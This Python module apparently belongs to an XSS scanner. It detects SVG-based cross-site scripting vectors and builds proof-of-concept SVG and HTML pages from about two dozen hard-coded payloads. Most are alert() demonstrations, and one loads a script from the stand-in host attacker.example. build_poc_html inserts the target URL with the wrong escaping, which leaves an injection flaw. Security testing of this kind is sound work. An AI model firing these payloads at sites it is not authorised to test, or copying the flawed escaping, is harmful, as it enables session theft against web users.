"""SVG-based XSS vector detection.

The detection-vector corpus now lives in ``data/svg_xss.json`` -- edit THAT
file to add or adjust vectors -- and this module re-compiles the regexes at
import.  Public API unchanged:

    analyze_svg(html) -> dict
    build_poc_svg(vector_type) -> str
    build_poc_html(target_url, vector_type) -> str
    supported_vector_types() -> list[str]
"""
from __future__ import annotations

import json
import os
import re

_DATA_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                          "data", "svg_xss.json")

with open(_DATA_FILE, encoding="utf-8") as _f:
    _RULES = json.load(_f)

SvgPatternDef = tuple[re.Pattern, str, str, str]

# (compiled_regex, description, severity, vector_type).
SVG_XSS_PATTERNS: list[SvgPatternDef] = [
    (re.compile(src, re.IGNORECASE | re.DOTALL), desc, sev, vtype)
    for src, desc, sev, vtype in _RULES["svg_raw_patterns"]
]

# Backwards-compatible raw view (string regexes).
_SVG_RAW_PATTERNS: list[tuple[str, str, str, str]] = [
    tuple(t) for t in _RULES["svg_raw_patterns"]
]

# Severity ranking -- higher = more dangerous.
_SEVERITY_RANK: dict[str, int] = _RULES["severity_rank"]

# PoC payload snippets per vector type.
_POC_PAYLOADS: dict[str, str] = _RULES["poc_payloads"]


def analyze_svg(html: str | None) -> dict:
    """Scan an HTML or SVG response for SVG-based XSS vectors.

    Returns::

        {
            "vulnerable_count": int,         # total findings
            "findings":         list[dict],  # see below
            "exploitable":      bool,        # True if any high-severity
                                              # finding is present
            "vector_types":     list[str],   # unique vector_type tags
        }

    Each finding dict has the shape::

        {
            "pattern":      str,   # regex source
            "description":  str,   # human-readable explanation
            "severity":     str,   # "high" | "medium" | "low"
            "vector_type":  str,   # short tag (e.g. "svg_use_jsuri")
            "snippet":      str,   # ~120-char window around the match
        }
    """
    if not html:
        return {
            "vulnerable_count": 0,
            "findings": [],
            "exploitable": False,
            "vector_types": [],
        }
    findings: list[dict] = []
    # De-duplicate ONLY within the same vector_type.  Different vector_types
    # represent different vulnerabilities with different remediation advice
    # (e.g. ``svg_script`` vs ``svg_foreignobject_script``) and must both be
    # reported even when their match spans overlap.  A previous cross-type
    # dedup suppressed the more specific ``svg_foreignobject_script`` finding
    # because its span sat inside the larger ``svg_script`` span.
    seen_spans_by_type: dict[str, set[tuple[int, int]]] = {}
    for regex, desc, sev, vtype in SVG_XSS_PATTERNS:
        for m in regex.finditer(html):
            start, end = m.span()
            seen = seen_spans_by_type.setdefault(vtype, set())
            duplicate = False
            for s, e in seen:
                overlap = max(0, min(end, e) - max(start, s))
                if overlap > 0 and overlap >= 0.5 * max(end - start, e - s):
                    duplicate = True
                    break
            if duplicate:
                continue
            seen.add((start, end))
            # Build a ~120-char snippet centered on the match.
            ctx_start = max(0, start - 40)
            ctx_end = min(len(html), end + 80)
            snippet = html[ctx_start:ctx_end]
            # Collapse whitespace for readability.
            snippet = re.sub(r"\s+", " ", snippet).strip()
            if len(snippet) > 160:
                snippet = snippet[:157] + "..."
            findings.append({
                "pattern": regex.pattern,
                "description": desc,
                "severity": sev,
                "vector_type": vtype,
                "snippet": snippet,
            })
    # Sort findings by severity (high first).
    findings.sort(key=lambda f: -_SEVERITY_RANK.get(f["severity"], 0))
    vector_types = sorted({f["vector_type"] for f in findings})
    exploitable = any(f["severity"] == "high" for f in findings)
    return {
        "vulnerable_count": len(findings),
        "findings": findings,
        "exploitable": exploitable,
        "vector_types": vector_types,
    }


# Canonical PoC payloads for each high-severity vector type.  Used by
# ``build_poc_svg`` to produce a minimal demonstration of the vector.
_POC_PAYLOADS: dict[str, str] = {
    "svg_script": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<script>alert("XSS:svg_script")</script>'
        '</svg>'
    ),
    "svg_script_external": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<script xlink:href="https://attacker.example/x.js"/>'
        '</svg>'
    ),
    "svg_script_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<script xlink:href="javascript:alert(\'XSS:svg_script_jsuri\')"/>'
        '</svg>'
    ),
    "svg_foreignobject_script": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<foreignObject width="100%" height="100%">'
        '<body xmlns="http://www.w3.org/1999/xhtml">'
        '<script>alert("XSS:svg_foreignobject_script")</script>'
        '</body></foreignObject></svg>'
    ),
    "svg_foreignobject_iframe": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<foreignObject width="100%" height="100%">'
        '<body xmlns="http://www.w3.org/1999/xhtml">'
        '<iframe src="javascript:alert(\'XSS:svg_foreignobject_iframe\')">'
        '</iframe>'
        '</body></foreignObject></svg>'
    ),
    "svg_foreignobject_event": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<foreignObject width="100%" height="100%">'
        '<body xmlns="http://www.w3.org/1999/xhtml">'
        '<div onload="alert(\'XSS:svg_foreignobject_event\')">x</div>'
        '</body></foreignObject></svg>'
    ),
    "svg_foreignobject_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<foreignObject width="100%" height="100%">'
        '<body xmlns="http://www.w3.org/1999/xhtml">'
        '<a href="javascript:alert(\'XSS:svg_foreignobject_jsuri\')">click</a>'
        '</body></foreignObject></svg>'
    ),
    "svg_use_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<use xlink:href="javascript:alert(\'XSS:svg_use_jsuri\')"/>'
        '</svg>'
    ),
    "svg_use_data": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<use xlink:href="data:image/svg+xml,&lt;svg/&gt;"/>'
        '</svg>'
    ),
    "svg_set_event": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<set attributeName="onload" to="alert(\'XSS:svg_set_event\')"/>'
        '<rect width="100" height="100"/>'
        '</svg>'
    ),
    "svg_set_href_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<a xlink:href="javascript:void(0)">'
        '<set attributeName="xlink:href" '
        'to="javascript:alert(\'XSS:svg_set_href_jsuri\')"/>'
        'click</a></svg>'
    ),
    "svg_animate_event": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<animate attributeName="onload" '
        'to="alert(\'XSS:svg_animate_event\')" dur="1s"/>'
        '<rect width="100" height="100"/>'
        '</svg>'
    ),
    "svg_animate_href_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<a xlink:href="javascript:void(0)">'
        '<animate attributeName="xlink:href" '
        'values="javascript:alert(\'XSS:svg_animate_href_jsuri\')" '
        'dur="1s"/>click</a></svg>'
    ),
    "svg_animatetransform_event": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<animateTransform attributeName="onload" '
        'to="alert(\'XSS:svg_animatetransform_event\')" '
        'type="rotate" dur="1s"/>'
        '<rect width="100" height="100"/>'
        '</svg>'
    ),
    "svg_animatemotion_event": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<animateMotion onbegin="alert(\'XSS:svg_animatemotion_event\')" '
        'dur="1s" path="M0,0 L100,100"/>'
        '<rect width="10" height="10"/>'
        '</svg>'
    ),
    "svg_smil_onbegin": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<set onbegin="alert(\'XSS:svg_smil_onbegin\')" '
        'attributeName="x" to="0" dur="1s"/>'
        '<rect width="100" height="100"/>'
        '</svg>'
    ),
    "svg_a_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<a xlink:href="javascript:alert(\'XSS:svg_a_jsuri\')">'
        '<text>click</text></a></svg>'
    ),
    "svg_image_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<image xlink:href="javascript:alert(\'XSS:svg_image_jsuri\')" '
        'width="100" height="100"/></svg>'
    ),
    "svg_handler": (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:ev="http://www.w3.org/2001/xml-events">'
        '<rect width="100" height="100">'
        '<handler ev:event="click" type="application/ecmascript">'
        'alert("XSS:svg_handler")</handler></rect></svg>'
    ),
    "svg_discard_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<discard href="javascript:alert(\'XSS:svg_discard_jsuri\')" '
        'begin="0s"/><rect width="100" height="100"/></svg>'
    ),
    "svg_onload": (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'onload="alert(\'XSS:svg_onload\')">'
        '<rect width="100" height="100"/></svg>'
    ),
    "svg_style_expression": (
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<style>rect{x:expression(alert(\'XSS:svg_style_expression\'))}</style>'
        '<rect width="100" height="100"/></svg>'
    ),
    "svg_text_jsuri": (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xlink="http://www.w3.org/1999/xlink">'
        '<text xlink:href="javascript:alert(\'XSS:svg_text_jsuri\')">'
        'click</text></svg>'
    ),
}


def build_poc_svg(vector_type: str) -> str:
    """Return a standalone SVG document demonstrating ``vector_type``.

    Returns an empty string if no PoC is defined for the given vector
    type.  The SVG document is a complete ``<?xml ... ?><svg ...>``
    document that can be saved as ``poc.svg`` and opened in a browser.
    """
    payload = _POC_PAYLOADS.get(vector_type)
    if not payload:
        return ""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!-- XSSentinel SVG-XSS PoC -->\n'
        f'{payload}\n'
    )


def build_poc_html(target_url: str, vector_type: str) -> str:
    """Wrap the SVG PoC for ``vector_type`` in a minimal HTML page.

    The HTML page embeds the SVG inline so a single ``poc.html`` file
    can be opened in any browser without serving a separate ``.svg``.
    Returns an empty string if no PoC is defined for the vector type.
    """
    payload = _POC_PAYLOADS.get(vector_type)
    if not payload:
        return ""
    # HTML-escape the payload for display in <pre> blocks.
    html_payload = (
        payload.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )
    # JS-string-safe versions for embedding in script.
    js_url = (
        target_url.replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace("</", "<\\/")
    )
    return (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head>\n"
        '  <meta charset="utf-8">\n'
        "  <title>XSSentinel SVG-XSS PoC</title>\n"
        "  <style>\n"
        "    body{font:14px/1.4 monospace;background:#111;color:#eee;"
        "padding:24px}\n"
        "    pre{background:#000;color:#0f0;padding:12px;"
        "border:1px solid #333;white-space:pre-wrap}\n"
        "    a{color:#6cf}\n"
        "    .svg-frame{background:#fff;color:#000;padding:12px;"
        "border:1px solid #555;margin:12px 0}\n"
        "  </style>\n"
        "</head>\n"
        "<body>\n"
        "  <h1>XSSentinel &mdash; SVG-XSS PoC</h1>\n"
        f"  <p>Vector: <code>{vector_type}</code></p>\n"
        f"  <p>Target: <code>{target_url}</code></p>\n"
        "  <p>SVG payload (source):</p>\n"
        f"  <pre>{html_payload}</pre>\n"
        "  <p>Live demo below.  If the payload executes "
        "(alert / console log), the SVG vector is exploitable.</p>\n"
        "  <hr>\n"
        '  <div class="svg-frame">\n'
        f"    {payload}\n"
        "  </div>\n"
        "  <hr>\n"
        '  <p><a href="' + js_url + '" target="_blank">Open target URL</a></p>\n'
        "</body>\n"
        "</html>\n"
    )


def supported_vector_types() -> list[str]:
    """Return the list of vector types that have a PoC payload defined."""
    return sorted(_POC_PAYLOADS.keys())
